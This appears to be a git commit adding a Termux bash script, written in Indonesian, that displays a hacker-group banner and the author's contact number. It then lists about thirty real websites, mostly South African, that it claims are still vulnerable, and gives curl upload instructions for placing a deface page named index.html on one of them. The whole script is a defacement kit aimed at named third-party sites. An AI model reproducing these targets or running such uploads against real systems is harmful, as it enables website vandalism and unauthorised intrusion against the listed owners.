a0d342268f45cea340521b176ce5cb67c9ca3720
TU4NG4L4U <46773642+TU4NG4L4U@users.noreply.github.com>
2019-02-05 15:54:26 +0700

    Add files via upload

---
+++ DrakNet.sh
@@ -0,0 +1,93 @@
+clear
+echo
+echo
+
+figlet TU4N G4L4U | lolcat
+
+echo
+echo "____________________________________________________"
+echo "Athuar:TUAN GALAU $red " | lolcat
+echo "WA    :081514074360 $yellow " | lolcat
+echo "Grub  : TERMUX TEAM CYBER $green " | lolcat
+echo "Thanks: MR.1Z4K4 And Fahri $blue " | lolcat
+echo "FB Gua:Hai $red " | lolcat
+echo "____________________________________________________"
+echo
+echo
+echo
+echo "(--)=========================(--)"
+echo "Kumpulan Link Yg Masih Vuln $green " | lolcat
+echo ""
+echo ""
+echo ""
+echo "http://contsol.co.za"
+echo
+echo "http://colourfactory.co.za"
+echo
+echo "http://chillibitez.co.za"
+echo
+echo "http://chasingfantasia.com"
+echo
+echo "http://centraltech.co.za"
+echo
+echo "http://cblandscapes.co.za"
+echo
+echo "http://bee-it.co.za"
+echo
+echo "http://tieronecapital.co.za"
+echo
+echo "http://sublimeconfectionery.co.za"
+echo
+echo "http://systemshouse.co.za"
+echo
+echo "http://bananabox.co.za"
+echo
+echo "http://ayk.co.za"
+echo
+echo "http://ads247.co.za"
+echo
+echo "http://africa-one.co.za"
+echo
+echo "http://allpaint.co.za"
+echo
+echo "http://atlanticphysio.co.za"
+echo
+echo "http://valdicare.co.za"
+echo
+echo "http://vmicl.co.za"
+echo
+echo "http://troon.co.za"
+echo
+echo "http://nyarhi.co.za"
+echo
+echo "http://nitrobikes.co.za"
+echo
+echo "http://nhisa.co.zam"
+echo
+echo "http://netcallcollect.co.za"
+echo
+echo "http://naturaleyeimages.com"
+echo
+echo "http://mpark.co.za"
+echo
+echo "http://moneyin1week.co.za"
+echo
+echo "http://mix007.co.za"
+echo
+echo
+echo "http://mediacube.co.za"
+echo
+echo "http://megro.co.za"
+echo
+echo "(+)Sialkan Pilih Satu Aja 93% Masih Vuln $red "
+echo
+echo "(+)Untuk MenjalanKannya Ketik $yellow " | lolcat
+echo
+echo "pkg install curl "
+echo
+echo "curl -T /storage/emulated/0/index.html"
+echo
+echo "(+)Taru Sc Deface Harus Internal(+) $red " | lolcat
+echo "(+)Nama Sc Harus index.html(+) $green " | lolcat
+echo
+echo
